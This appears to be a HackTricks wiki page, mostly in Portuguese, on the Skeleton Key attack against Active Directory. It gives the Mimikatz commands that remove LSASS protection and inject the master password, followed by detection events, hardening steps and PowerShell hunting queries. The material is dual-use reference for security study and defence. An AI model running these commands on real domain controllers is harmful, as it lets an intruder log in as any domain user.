# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

The **Skeleton Key attack** é uma técnica que permite aos atacantes **contornar a autenticação do Active Directory** ao **injetar uma senha mestra** no processo LSASS de cada domain controller. Após a injeção, a senha mestra (padrão **`mimikatz`**) pode ser usada para autenticar como **qualquer usuário do domínio** enquanto suas senhas reais continuam funcionando.

Principais fatos:

- Requer **Domain Admin/SYSTEM + SeDebugPrivilege** em cada DC e deve ser **reaplicado após cada reinicialização**.
- Modifica os caminhos de validação do **NTLM** e **Kerberos RC4 (etype 0x17)**; realms somente com **AES** ou contas que forcem AES **não aceitarão o skeleton key**.
- Pode conflitar com pacotes de autenticação LSA de terceiros ou provedores adicionais de smart‑card / **MFA**.
- O módulo Mimikatz aceita a opção `/letaes` para evitar tocar nos hooks Kerberos/AES em caso de problemas de compatibilidade.

### Execution

LSASS clássico não protegido por PPL:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Se **LSASS is running as PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), é necessário um driver de kernel para remover a proteção antes de patching LSASS:
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Após a injeção, autentique-se com qualquer conta do domínio, mas use a senha `mimikatz` (ou o valor definido pelo operador). Lembre‑se de repetir em **todos os DCs** em ambientes com múltiplos DCs.

## Mitigações

- **Monitoramento de logs**
- System **Event ID 7045** (service/driver install) para drivers não assinados como `mimidrv.sys`.
- **Sysmon**: Event ID 7 (driver load) para `mimidrv.sys`; Event ID 10 para acesso suspeito a `lsass.exe` por processos não‑sistema.
- Security **Event ID 4673/4611** para uso de privilégios sensíveis ou anomalias no registro de pacotes de autenticação LSA; correlacione com logons 4624 inesperados usando RC4 (etype 0x17) vindos dos DCs.
- **Endurecimento do LSASS**
- Mantenha **RunAsPPL/Credential Guard/Secure LSASS** habilitados nos DCs para forçar atacantes a implantar drivers em modo kernel (mais telemetria, exploração mais difícil).
- Desative o **RC4** legado quando possível; limitar tickets Kerberos ao AES previne o caminho de hook RC4 usado pelo skeleton key.
- Buscas rápidas em PowerShell:
- Detectar instalações de drivers de modo kernel não assinados: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Procurar driver do Mimikatz: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Validar que PPL está aplicado após reinicialização: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

Para orientação adicional sobre endurecimento de credenciais verifique [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## References

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
